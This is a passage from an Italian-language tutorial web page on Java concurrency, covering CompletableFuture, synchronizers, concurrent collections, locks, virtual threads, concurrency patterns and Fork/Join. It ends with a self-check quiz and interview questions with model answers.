                    <pre><code class="language-java">// Scenario: chiamare 3 API in parallelo e combinare i risultati

public UserProfile getUserProfile(String userId) {
    CompletableFuture&lt;User&gt; userFuture = CompletableFuture
        .supplyAsync(() -> userService.getUser(userId));

    CompletableFuture&lt;List&lt;Order&gt;&gt; ordersFuture = CompletableFuture
        .supplyAsync(() -> orderService.getOrders(userId));

    CompletableFuture&lt;Preferences&gt; prefsFuture = CompletableFuture
        .supplyAsync(() -> prefsService.getPreferences(userId));

    // Aspetta tutti e combina
    return userFuture.thenCombine(ordersFuture, (user, orders) ->
            new UserWithOrders(user, orders))
        .thenCombine(prefsFuture, (userWithOrders, prefs) ->
            new UserProfile(userWithOrders, prefs))
        .join();  // blocking solo alla fine
}

// Alternativa con allOf + stream
public UserProfile getUserProfileAlt(String userId) {
    CompletableFuture&lt;User&gt; userFuture = /*...*/;
    CompletableFuture&lt;List&lt;Order&gt;&gt; ordersFuture = /*...*/;
    CompletableFuture&lt;Preferences&gt; prefsFuture = /*...*/;

    CompletableFuture.allOf(userFuture, ordersFuture, prefsFuture).join();

    // Ora tutti sono completati
    return new UserProfile(
        userFuture.join(),
        ordersFuture.join(),
        prefsFuture.join()
    );
}</code></pre>
                </div>
            </section>

            <!-- Synchronizers Section -->
            <section class="section" id="modulo14-synchronizers">
                <h2>Synchronizers: Latch, Barrier, Semaphore</h2>

                <p>Java fornisce utility di sincronizzazione ad alto livello per coordinare thread.</p>

                <h3>CountDownLatch</h3>
                <pre><code class="language-java">import java.util.concurrent.CountDownLatch;

// CountDownLatch: aspetta che N eventi accadano
// Il counter può solo decrementare, non può essere resettato

public class StartupSequence {
    public static void main(String[] args) throws InterruptedException {
        int numServices = 3;
        CountDownLatch latch = new CountDownLatch(numServices);

        // Avvia i servizi in parallelo
        for (int i = 0; i < numServices; i++) {
            final int serviceId = i;
            new Thread(() -> {
                try {
                    System.out.println("Service " + serviceId + " starting...");
                    Thread.sleep((long) (Math.random() * 2000));
                    System.out.println("Service " + serviceId + " ready!");
                    latch.countDown();  // decrementa il counter
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }).start();
        }

        System.out.println("Waiting for all services...");
        latch.await();  // blocca finché counter != 0
        // latch.await(10, TimeUnit.SECONDS);  // con timeout
        System.out.println("All services ready! Starting application.");
    }
}

// Use case tipici:
// - Aspettare che N worker completino l'inizializzazione
// - Test: aspettare che N thread siano pronti prima di iniziare
// - Shutdown graceful: aspettare che N task finiscano</code></pre>

                <h3>CyclicBarrier</h3>
                <pre><code class="language-java">import java.util.concurrent.CyclicBarrier;
import java.util.concurrent.BrokenBarrierException;

// CyclicBarrier: N thread si aspettano a vicenda a un punto di sincronizzazione
// A differenza di CountDownLatch, è RIUTILIZZABILE (cyclic)

public class ParallelComputation {
    public static void main(String[] args) {
        int numWorkers = 4;

        // Azione da eseguire quando tutti raggiungono la barriera
        Runnable barrierAction = () ->
            System.out.println("All workers reached barrier, merging results...");

        CyclicBarrier barrier = new CyclicBarrier(numWorkers, barrierAction);

        for (int i = 0; i < numWorkers; i++) {
            final int workerId = i;
            new Thread(() -> {
                try {
                    // Fase 1: elaborazione
                    System.out.println("Worker " + workerId + " processing phase 1...");
                    Thread.sleep((long) (Math.random() * 1000));

                    System.out.println("Worker " + workerId + " waiting at barrier...");
                    barrier.await();  // aspetta gli altri

                    // Fase 2: tutti sincronizzati
                    System.out.println("Worker " + workerId + " processing phase 2...");

                    barrier.await();  // riutilizza la stessa barriera!

                    // Fase 3
                    System.out.println("Worker " + workerId + " done!");

                } catch (InterruptedException | BrokenBarrierException e) {
                    Thread.currentThread().interrupt();
                }
            }).start();
        }
    }
}

// Use case tipici:
// - Algoritmi paralleli con fasi (es: parallel merge sort)
// - Simulazioni dove tutti gli agenti devono sincronizzarsi a ogni step
// - Testing: sincronizzare l'inizio di N thread</code></pre>

                <h3>Semaphore</h3>
                <pre><code class="language-java">import java.util.concurrent.Semaphore;

// Semaphore: limita l'accesso a una risorsa a N thread contemporaneamente

public class ConnectionPool {
    private final Semaphore semaphore;
    private final List&lt;Connection&gt; connections;

    public ConnectionPool(int poolSize) {
        this.semaphore = new Semaphore(poolSize);  // N permits
        this.connections = new ArrayList&lt;&gt;(poolSize);
        for (int i = 0; i < poolSize; i++) {
            connections.add(createConnection());
        }
    }

    public Connection acquire() throws InterruptedException {
        semaphore.acquire();  // blocca se nessun permit disponibile
        return getConnectionFromPool();
    }

    // Non-blocking version
    public Connection tryAcquire() {
        if (semaphore.tryAcquire()) {  // ritorna subito false se non disponibile
            return getConnectionFromPool();
        }
        return null;  // o lancia eccezione
    }

    public void release(Connection conn) {
        returnConnectionToPool(conn);
        semaphore.release();  // rilascia un permit
    }
}

// Binary Semaphore (1 permit) = equivalente a un Lock
Semaphore mutex = new Semaphore(1);
mutex.acquire();
try {
    // critical section
} finally {
    mutex.release();
}

// Differenza da Lock: Semaphore può essere rilasciato da thread diverso
// da quello che ha acquisito (utile in alcuni scenari async)</code></pre>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    CountDownLatch vs CyclicBarrier                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  CountDownLatch                         CyclicBarrier                       │
│  ─────────────────                      ─────────────────                   │
│                                                                             │
│  • One-time use                         • Reusable (cyclic)                 │
│  • N events, M waiters                  • N threads wait for each other     │
│  • countdown() + await()                • await() only                      │
│  • Thread A può fare countDown,         • Ogni thread deve fare await()     │
│    thread B può fare await              • Stesso thread partecipa           │
│                                                                             │
│  Esempio:                               Esempio:                            │
│  ─────────                               ─────────                           │
│  Main thread aspetta che                 4 worker si sincronizzano          │
│  3 servizi si inizializzino              a ogni fase dell'algoritmo         │
│                                                                             │
│       ┌───┐                                   ┌───┐                         │
│       │ W1│──┐                                │ W1│──┐                      │
│       └───┘  │                                └───┘  │                      │
│       ┌───┐  │ countDown()                    ┌───┐  │ await()              │
│       │ W2│──┼──────────►[Latch]              │ W2│──┼──────────►[Barrier]  │
│       └───┘  │           count--              └───┘  │           count--    │
│       ┌───┐  │              │                 ┌───┐  │              │       │
│       │ W3│──┘              │                 │ W3│──┤              │       │
│       └───┘                 ▼                 └───┘  │              │       │
│                         [Main]                ┌───┐  │              ▼       │
│                         await()               │ W4│──┘         All resume   │
│                                               └───┘            together     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Concurrent Collections Section -->
            <section class="section" id="modulo14-collections">
                <h2>Concurrent Collections</h2>

                <p>Le collection standard (ArrayList, HashMap) non sono thread-safe. Java fornisce alternative concorrenti nel package <code>java.util.concurrent</code>.</p>

                <h3>ConcurrentHashMap</h3>
                <pre><code class="language-java">import java.util.concurrent.ConcurrentHashMap;

// NON usare:
// - HashMap: non thread-safe
// - Collections.synchronizedMap(map): lock globale (slow)
// - Hashtable: legacy, lock globale

// USA ConcurrentHashMap: lock striping, alta concorrenza
ConcurrentHashMap&lt;String, Integer&gt; map = new ConcurrentHashMap&lt;&gt;();

// Operazioni atomiche (NO race conditions)
map.put("key", 1);
map.putIfAbsent("key", 2);  // mette solo se assente, ritorna valore esistente
map.remove("key", 1);       // rimuove solo se key→1
map.replace("key", 1, 2);   // sostituisce solo se key→1

// Compute atomico (Java 8+)
map.compute("counter", (key, oldValue) -> {
    return (oldValue == null) ? 1 : oldValue + 1;
});

map.computeIfAbsent("key", k -> expensiveComputation(k));
map.computeIfPresent("key", (k, v) -> v + 1);

// ATTENZIONE: iteratori sono weakly consistent
// Potrebbero non vedere modifiche fatte dopo la creazione dell'iteratore
// Non lanciano ConcurrentModificationException

// Bulk operations (Java 8+)
map.forEach(4, (k, v) -> System.out.println(k + "=" + v));  // parallelism threshold = 4
long count = map.reduceValuesToLong(4, v -> v, 0L, Long::sum);

// NON fare check-then-act non atomici!
// SBAGLIATO:
if (!map.containsKey("key")) {
    map.put("key", value);  // race condition tra check e put
}
// CORRETTO:
map.putIfAbsent("key", value);</code></pre>

                <h3>BlockingQueue</h3>
                <pre><code class="language-java">import java.util.concurrent.*;

// BlockingQueue: coda che blocca su put (se piena) e take (se vuota)
// Ideale per pattern Producer-Consumer

// Implementazioni:
// - ArrayBlockingQueue: bounded, array-backed
// - LinkedBlockingQueue: optionally bounded, linked nodes
// - PriorityBlockingQueue: unbounded, priority order
// - SynchronousQueue: zero capacity, direct handoff

BlockingQueue&lt;Task&gt; queue = new ArrayBlockingQueue&lt;&gt;(100);

// Producer
public void produce(Task task) throws InterruptedException {
    queue.put(task);  // blocca se queue piena
    // queue.offer(task, 5, TimeUnit.SECONDS);  // timeout
}

// Consumer
public void consume() throws InterruptedException {
    while (true) {
        Task task = queue.take();  // blocca se queue vuota
        process(task);
    }
}

// SynchronousQueue: nessun buffer, handoff diretto
// put() blocca finché un altro thread non fa take()
SynchronousQueue&lt;Task&gt; directHandoff = new SynchronousQueue&lt;&gt;();
// Usato internamente da CachedThreadPool</code></pre>

                <h3>CopyOnWriteArrayList</h3>
                <pre><code class="language-java">import java.util.concurrent.CopyOnWriteArrayList;

// CopyOnWriteArrayList: crea una copia dell'array ad ogni modifica
// Letture sono veloci (no lock), scritture sono costose

CopyOnWriteArrayList&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;();

// Quando usare:
// - Read-heavy workload (molte più letture che scritture)
// - Iterazione frequente senza voler lock
// - Liste piccole (la copia è O(n))

// Esempio: lista di listeners
class EventManager {
    private final CopyOnWriteArrayList&lt;EventListener&gt; listeners =
        new CopyOnWriteArrayList&lt;&gt;();

    public void addListener(EventListener listener) {
        listeners.add(listener);  // costoso, ma raro
    }

    public void fireEvent(Event event) {
        // Iterazione sicura, snapshot dell'array
        for (EventListener listener : listeners) {
            listener.onEvent(event);  // no ConcurrentModificationException
        }
    }
}

// NON usare per:
// - Write-heavy workload
// - Liste grandi</code></pre>

                <h3>ReadWriteLock vs StampedLock</h3>
                <pre><code class="language-java">import java.util.concurrent.locks.*;

// ReadWriteLock: multiple readers OR single writer
ReentrantReadWriteLock rwLock = new ReentrantReadWriteLock();

public String read() {
    rwLock.readLock().lock();  // più reader possono acquisire
    try {
        return data;
    } finally {
        rwLock.readLock().unlock();
    }
}

public void write(String newData) {
    rwLock.writeLock().lock();  // esclusivo
    try {
        this.data = newData;
    } finally {
        rwLock.writeLock().unlock();
    }
}

// StampedLock (Java 8+): più performante, supporta optimistic read
StampedLock stampedLock = new StampedLock();

public String optimisticRead() {
    long stamp = stampedLock.tryOptimisticRead();  // non blocca!
    String currentData = this.data;

    if (!stampedLock.validate(stamp)) {
        // Qualcuno ha scritto nel frattempo, fallback a pessimistic read
        stamp = stampedLock.readLock();
        try {
            currentData = this.data;
        } finally {
            stampedLock.unlockRead(stamp);
        }
    }
    return currentData;
}

public void stampedWrite(String newData) {
    long stamp = stampedLock.writeLock();
    try {
        this.data = newData;
    } finally {
        stampedLock.unlockWrite(stamp);
    }
}

// StampedLock:
// - NON è reentrant (non puoi acquisire lo stesso lock due volte)
// - Optimistic read è ideale per read-heavy con scritture rare
// - Non supporta Condition</code></pre>
            </section>

            <!-- Virtual Threads Section -->
            <section class="section" id="modulo14-virtual">
                <h2>Virtual Threads (Java 21+)</h2>

                <p>I Virtual Threads sono thread leggeri gestiti dalla JVM, non dal sistema operativo. Permettono di scalare a milioni di thread concorrenti.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                  Platform Threads vs Virtual Threads                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PLATFORM THREADS (traditional)                                            │
│  ─────────────────────────────                                              │
│                                                                             │
│  ┌─────────────┐   1:1   ┌─────────────┐                                    │
│  │Java Thread 1│─────────│ OS Thread 1 │  ~1MB stack                       │
│  └─────────────┘         └─────────────┘                                    │
│  ┌─────────────┐   1:1   ┌─────────────┐                                    │
│  │Java Thread 2│─────────│ OS Thread 2 │  ~1MB stack                       │
│  └─────────────┘         └─────────────┘                                    │
│                                                                             │
│  Limite pratico: ~10,000 thread (memory, context switch overhead)          │
│                                                                             │
│  ════════════════════════════════════════════════════════════════════════   │
│                                                                             │
│  VIRTUAL THREADS (Java 21+)                                                │
│  ────────────────────────────                                               │
│                                                                             │
│  ┌───────┐ ┌───────┐ ┌───────┐ ┌───────┐                                    │
│  │VT 1   │ │VT 2   │ │VT 3   │ │VT 4   │  ~1KB stack (grows as needed)     │
│  └───┬───┘ └───┬───┘ └───┬───┘ └───┬───┘                                    │
│      │         │         │         │      M:N mapping                       │
│      └────┬────┴────┬────┴────┬────┘                                        │
│           │         │         │                                             │
│      ┌────▼───┐ ┌───▼────┐ ┌──▼─────┐                                       │
│      │Carrier │ │Carrier │ │Carrier │  Pool of OS threads (ForkJoinPool)   │
│      │Thread 1│ │Thread 2│ │Thread 3│                                       │
│      └────────┘ └────────┘ └────────┘                                       │
│                                                                             │
│  Scala a MILIONI di virtual threads!                                       │
│  Blocking I/O non blocca il carrier thread (unmount/mount)                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Creazione e Utilizzo</h3>
                <pre><code class="language-java">// Creazione di un virtual thread (Java 21+)

// Modo 1: Thread.startVirtualThread
Thread vt = Thread.startVirtualThread(() -> {
    System.out.println("Running in: " + Thread.currentThread());
});

// Modo 2: Thread.ofVirtual()
Thread vt2 = Thread.ofVirtual()
    .name("my-virtual-thread")
    .start(() -> System.out.println("Hello from virtual thread"));

// Modo 3: ExecutorService (PREFERITO per production)
try (ExecutorService executor = Executors.newVirtualThreadPerTaskExecutor()) {
    // Ogni task ottiene il suo virtual thread
    for (int i = 0; i < 100_000; i++) {
        executor.submit(() -> {
            // Simula I/O blocking (es: HTTP call, DB query)
            Thread.sleep(Duration.ofSeconds(1));
            return "done";
        });
    }
}  // auto-shutdown con try-with-resources

// Confronto: questo codice con platform threads richiederebbe
// 100,000 OS threads = ~100GB di memoria!
// Con virtual threads: ~100MB</code></pre>

                <h3>Quando Usare e Quando Evitare</h3>
                <pre><code class="language-java">// ✅ USA Virtual Threads per:
// - I/O-bound tasks (HTTP calls, database queries, file I/O)
// - Server che gestiscono molte connessioni concurrent
// - Codice che "aspetta" molto (sleep, wait, blocking read)

@GetMapping("/users/{id}")
public User getUser(@PathVariable Long id) {
    // Ogni request può avere il suo virtual thread
    // Blocking database call non blocca l'OS thread
    return userRepository.findById(id);  // OK con virtual threads!
}

// ❌ NON usare Virtual Threads per:
// - CPU-bound tasks (calcoli intensivi)
// - Task che tengono lock per molto tempo (pinning)

// PINNING: il virtual thread rimane "pinned" al carrier thread
// quando è dentro un synchronized block o native call
synchronized (lock) {
    // virtual thread è pinned, non può essere unmounted
    Thread.sleep(1000);  // blocca anche il carrier thread!
}

// Soluzione: usa ReentrantLock invece di synchronized
ReentrantLock lock = new ReentrantLock();
lock.lock();
try {
    Thread.sleep(1000);  // virtual thread può essere unmounted
} finally {
    lock.unlock();
}</code></pre>

                <h3>Structured Concurrency (Preview)</h3>
                <pre><code class="language-java">// Structured Concurrency: i thread child sono legati al lifecycle del parent
// Previene "thread leak" e semplifica error handling

import java.util.concurrent.StructuredTaskScope;

// Java 21 Preview Feature
public UserProfile fetchUserProfile(String userId) throws Exception {
    try (var scope = new StructuredTaskScope.ShutdownOnFailure()) {
        // Fork subtasks
        Supplier&lt;User&gt; userTask = scope.fork(() -> userService.getUser(userId));
        Supplier&lt;List&lt;Order&gt;&gt; ordersTask = scope.fork(() -> orderService.getOrders(userId));

        // Wait for all subtasks
        scope.join();           // blocca finché tutti completano
        scope.throwIfFailed();  // propaga eccezione se uno ha fallito

        // Tutti completati con successo
        return new UserProfile(userTask.get(), ordersTask.get());
    }
    // Se scope.join() viene interrotto o un task fallisce,
    // tutti i task vengono cancellati automaticamente
}

// ShutdownOnFailure: se uno fallisce, cancella gli altri
// ShutdownOnSuccess: appena uno ha successo, cancella gli altri

// Benefici:
// - Error handling chiaro (eccezione propagata)
// - No thread leak (scope garantisce cleanup)
// - Cancellation automatica
// - Debugging migliore (thread sono correlati)</code></pre>

                <div class="info-box success">
                    <h4>Virtual Threads in Spring Boot 3.2+</h4>
                    <pre><code class="language-yaml"># application.yml
spring:
  threads:
    virtual:
      enabled: true  # Abilita virtual threads per Tomcat</code></pre>
                    <p>Con questa configurazione, ogni HTTP request viene gestita da un virtual thread. Il blocking code (JDBC, RestTemplate, etc.) non blocca più i thread del pool, permettendo altissima concorrenza senza reactive programming.</p>
                </div>
            </section>

            <!-- Patterns Section -->
            <section class="section" id="modulo14-patterns">
                <h2>Pattern di Concorrenza</h2>

                <h3>Producer-Consumer</h3>
                <pre><code class="language-java">// Il pattern più comune: producer genera dati, consumer li processa
// BlockingQueue disaccoppia producer e consumer

public class ProducerConsumer {
    private final BlockingQueue&lt;Task&gt; queue;
    private volatile boolean running = true;

    public ProducerConsumer(int queueSize) {
        this.queue = new ArrayBlockingQueue&lt;&gt;(queueSize);
    }

    // Producer
    public void produce() {
        while (running) {
            Task task = generateTask();
            try {
                queue.put(task);  // blocca se queue piena (back-pressure)
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    // Consumer
    public void consume() {
        while (running || !queue.isEmpty()) {
            try {
                Task task = queue.poll(100, TimeUnit.MILLISECONDS);
                if (task != null) {
                    process(task);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    public void shutdown() {
        running = false;
    }
}

// Variante con ExecutorService
ExecutorService producers = Executors.newFixedThreadPool(2);
ExecutorService consumers = Executors.newFixedThreadPool(4);
BlockingQueue&lt;Task&gt; queue = new LinkedBlockingQueue&lt;&gt;(1000);

// Start producers
producers.submit(() -> { /* produce to queue */ });

// Start consumers
for (int i = 0; i < 4; i++) {
    consumers.submit(() -> { /* consume from queue */ });
}</code></pre>

                <h3>Thread-Safe Singleton</h3>
                <pre><code class="language-java">// Problema: Singleton lazy initialization thread-safe

// ❌ NON thread-safe
public class UnsafeSingleton {
    private static UnsafeSingleton instance;

    public static UnsafeSingleton getInstance() {
        if (instance == null) {  // race condition!
            instance = new UnsafeSingleton();
        }
        return instance;
    }
}

// ✅ Soluzione 1: synchronized (semplice ma lento)
public class SynchronizedSingleton {
    private static SynchronizedSingleton instance;

    public static synchronized SynchronizedSingleton getInstance() {
        if (instance == null) {
            instance = new SynchronizedSingleton();
        }
        return instance;
    }
}

// ✅ Soluzione 2: Double-Checked Locking (più efficiente)
public class DCLSingleton {
    private static volatile DCLSingleton instance;  // DEVE essere volatile!

    public static DCLSingleton getInstance() {
        if (instance == null) {                    // prima check (no lock)
            synchronized (DCLSingleton.class) {
                if (instance == null) {            // seconda check (con lock)
                    instance = new DCLSingleton();
                }
            }
        }
        return instance;
    }
}

// ✅ Soluzione 3: Initialization-on-demand holder (PREFERITA)
public class HolderSingleton {
    private HolderSingleton() {}

    private static class Holder {
        static final HolderSingleton INSTANCE = new HolderSingleton();
    }

    public static HolderSingleton getInstance() {
        return Holder.INSTANCE;  // lazy, thread-safe grazie al class loader
    }
}

// ✅ Soluzione 4: Enum (la più semplice, consigliata da Effective Java)
public enum EnumSingleton {
    INSTANCE;

    public void doSomething() {
        // ...
    }
}
// Vantaggi enum: thread-safe, serialization-safe, reflection-safe</code></pre>

                <h3>Fork/Join Framework</h3>
                <pre><code class="language-java">import java.util.concurrent.*;

// Fork/Join: divide-and-conquer parallelism
// RecursiveTask (ritorna valore) o RecursiveAction (void)

public class ParallelSum extends RecursiveTask&lt;Long&gt; {
    private static final int THRESHOLD = 10_000;
    private final long[] array;
    private final int start, end;

    public ParallelSum(long[] array, int start, int end) {
        this.array = array;
        this.start = start;
        this.end = end;
    }

    @Override
    protected Long compute() {
        int length = end - start;

        // Base case: compute directly
        if (length <= THRESHOLD) {
            long sum = 0;
            for (int i = start; i < end; i++) {
                sum += array[i];
            }
            return sum;
        }

        // Recursive case: split in two
        int mid = start + length / 2;

        ParallelSum leftTask = new ParallelSum(array, start, mid);
        ParallelSum rightTask = new ParallelSum(array, mid, end);

        leftTask.fork();    // esegui in parallelo
        Long rightResult = rightTask.compute();  // esegui nel thread corrente
        Long leftResult = leftTask.join();       // aspetta il risultato

        return leftResult + rightResult;
    }

    public static void main(String[] args) {
        long[] array = new long[100_000_000];
        // ... fill array

        ForkJoinPool pool = ForkJoinPool.commonPool();
        Long sum = pool.invoke(new ParallelSum(array, 0, array.length));
    }
}

// Work-stealing: se un thread finisce, "ruba" task dalla coda di altri
// Ideale per task con durata variabile

// Parallel Streams usano Fork/Join internamente
long sum = Arrays.stream(array)
    .parallel()
    .sum();</code></pre>
            </section>

            <!-- Quiz Section Modulo 14 -->
            <section class="quiz-section" id="modulo14-quiz">
                <h2>Quiz - Modulo 14: Concurrency</h2>

                <div class="quiz-question" data-correct="b">
                    <h4>Q66. Qual è il problema del seguente codice con due thread che chiamano increment()?</h4>
                    <pre><code class="language-java">class Counter {
    private int count = 0;
    public void increment() { count++; }
}</code></pre>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q66" value="a">
                            <span>Deadlock tra i due thread</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q66" value="b">
                            <span>Race condition: count++ non è atomico (read-modify-write)</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q66" value="c">
                            <span>Memory leak perché count non è volatile</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q66" value="d">
                            <span>Nessun problema, int è atomico in Java</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q66')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q66"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4>Q67. Qual è la differenza principale tra CountDownLatch e CyclicBarrier?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q67" value="a">
                            <span>CountDownLatch è thread-safe, CyclicBarrier no</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q67" value="b">
                            <span>CountDownLatch blocca i thread, CyclicBarrier li fa proseguire</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q67" value="c">
                            <span>CountDownLatch è one-time use, CyclicBarrier è riutilizzabile</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q67" value="d">
                            <span>CountDownLatch supporta timeout, CyclicBarrier no</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q67')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q67"></div>
                </div>

                <div class="quiz-question" data-correct="a">
                    <h4>Q68. Perché questo double-checked locking è SBAGLIATO senza volatile?</h4>
                    <pre><code class="language-java">private static Singleton instance;  // manca volatile!
public static Singleton getInstance() {
    if (instance == null) {
        synchronized (Singleton.class) {
            if (instance == null) {
                instance = new Singleton();
            }
        }
    }
    return instance;
}</code></pre>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q68" value="a">
                            <span>Un thread può vedere instance non-null ma parzialmente costruito</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q68" value="b">
                            <span>Il synchronized block non funziona senza volatile</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q68" value="c">
                            <span>Causa deadlock se due thread entrano contemporaneamente</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q68" value="d">
                            <span>Il codice è corretto, volatile è opzionale</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q68')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q68"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4>Q69. Quando è MEGLIO usare Virtual Threads rispetto a Platform Threads?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q69" value="a">
                            <span>Per task CPU-intensive come calcoli matematici</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q69" value="b">
                            <span>Per task che richiedono molti synchronized blocks</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q69" value="c">
                            <span>Quando il numero di task concurrent è basso (< 100)</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q69" value="d">
                            <span>Per task I/O-bound come HTTP calls e database queries</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q69')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q69"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4>Q70. Cosa succede se usi ConcurrentHashMap così?</h4>
                    <pre><code class="language-java">ConcurrentHashMap&lt;String, Integer&gt; map = new ConcurrentHashMap&lt;&gt;();
if (!map.containsKey("key")) {
    map.put("key", 1);
}</code></pre>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q70" value="a">
                            <span>Funziona correttamente, ConcurrentHashMap è thread-safe</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q70" value="b">
                            <span>Race condition: check e put non sono atomici insieme</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q70" value="c">
                            <span>ConcurrentModificationException</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q70" value="d">
                            <span>Deadlock se due thread eseguono contemporaneamente</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q70')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q70"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 14 -->
            <section class="section" id="modulo14-questions">
                <h2>Domande da Colloquio - Modulo 14</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra synchronized, volatile, e AtomicInteger.</h4>
                    <p><strong>Risposta attesa:</strong> <strong>synchronized</strong> fornisce mutual exclusion (un solo thread nel blocco) E visibilità (modifiche visibili all'uscita). Usa un lock, può causare contention. <strong>volatile</strong> fornisce solo visibilità: le scritture sono immediatamente visibili ad altri thread. NON fornisce atomicità - count++ su volatile è ancora una race condition. <strong>AtomicInteger</strong> fornisce operazioni atomiche (incrementAndGet, compareAndSet) usando CAS (Compare-And-Swap) a livello hardware. Non usa lock, quindi è più efficiente con bassa contention. Usa AtomicInteger per counter semplici, synchronized per critical sections complesse.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come eviti il deadlock nel tuo codice?</h4>
                    <p><strong>Risposta attesa:</strong> Un deadlock richiede 4 condizioni: mutual exclusion, hold-and-wait, no preemption, circular wait. Per prevenirlo: 1) <strong>Lock ordering</strong>: acquisire sempre i lock nello stesso ordine (rompe circular wait). 2) <strong>Lock timeout</strong>: usare tryLock(timeout) invece di lock() (rompe hold-and-wait). 3) <strong>Evitare lock annidati</strong>: acquisire tutti i lock necessari insieme o nessuno. 4) <strong>Lock-free structures</strong>: usare ConcurrentHashMap, AtomicInteger invece di synchronized quando possibile. Per rilevare: jstack, JConsole mostrano thread dump con deadlock detection. In produzione: monitoring dei thread BLOCKED.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la differenza tra sleep() e wait()?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Thread.sleep(ms)</strong>: il thread va in TIMED_WAITING per il tempo specificato. NON rilascia il lock se ne possiede uno. È un metodo statico di Thread. <strong>Object.wait()</strong>: il thread va in WAITING e RILASCIA il lock dell'oggetto. DEVE essere chiamato dentro un synchronized block sullo stesso oggetto. Si risveglia con notify()/notifyAll() o interrupt(). Usa wait/notify per comunicazione tra thread (es: producer-consumer). Usa sleep per pause semplici. Pattern: while(condition) { wait(); } per evitare spurious wakeups.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Cosa sono i Virtual Threads e quando li useresti?</h4>
                    <p><strong>Risposta attesa:</strong> Virtual Threads (Java 21) sono thread leggeri gestiti dalla JVM, non dal SO. Un platform thread = 1 OS thread (~1MB stack). Un virtual thread usa ~1KB, con M:N mapping su carrier threads. Permettono milioni di thread concorrenti. <strong>Quando usarli</strong>: I/O-bound workloads (HTTP calls, DB queries), server con molte connessioni. <strong>Quando evitarli</strong>: CPU-bound tasks (nessun vantaggio), codice con molti synchronized blocks (pinning: il VT resta "pinned" al carrier thread). In Spring Boot 3.2+: spring.threads.virtual.enabled=true. Con VT, il codice blocking diventa scalabile senza reactive programming.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come funziona il Fork/Join framework?</h4>
                    <p><strong>Risposta attesa:</strong> Fork/Join implementa divide-and-conquer parallelism. Si estende RecursiveTask<T> (con risultato) o RecursiveAction (void). Nel compute(): se il task è piccolo, calcola direttamente; altrimenti splitta in subtask, fork() uno, compute() l'altro, poi join(). <strong>Work-stealing</strong>: ogni thread ha una deque di task. Se finisce, "ruba" task dalla coda di altri thread. Ottimo per task con durata variabile. ForkJoinPool.commonPool() è condiviso con Parallel Streams. Esempio: parallel sum di un array - splitta a metà, fork left, compute right, join results.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Perché usare ConcurrentHashMap invece di Collections.synchronizedMap()?</h4>
                    <p><strong>Risposta attesa:</strong> synchronizedMap usa un lock globale su ogni operazione → bassa concorrenza. ConcurrentHashMap usa lock striping: la mappa è divisa in segmenti, ogni segmento ha il suo lock. Letture sono lock-free nella maggior parte dei casi. Operazioni atomiche built-in: putIfAbsent, compute, merge evitano race conditions check-then-act. Iteratori sono weakly consistent (no ConcurrentModificationException). Bulk operations parallele: forEach, reduce con parallelism threshold. synchronizedMap ha senso solo se hai già una Map esistente e vuoi wrappare.</p>
                </div>
            </section>

            <!-- Links Modulo 14 -->
            <section class="section" id="modulo14-links">
